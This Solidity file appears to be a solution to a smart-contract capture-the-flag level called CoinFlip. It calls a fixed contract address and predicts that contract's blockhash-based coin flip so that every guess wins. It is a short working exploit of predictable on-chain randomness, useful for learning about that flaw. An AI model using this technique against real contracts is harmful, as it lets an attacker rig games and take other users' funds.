// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.11;

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract _03_CoinFlip {
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip CoinFlipContract = CoinFlip(0x304ACAd8d90cbBA8829644dC8D0175eA24dfB865);
  
  function win() external returns (bool) {
    // Copy the code given 
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return CoinFlipContract.flip(side);
  }
}
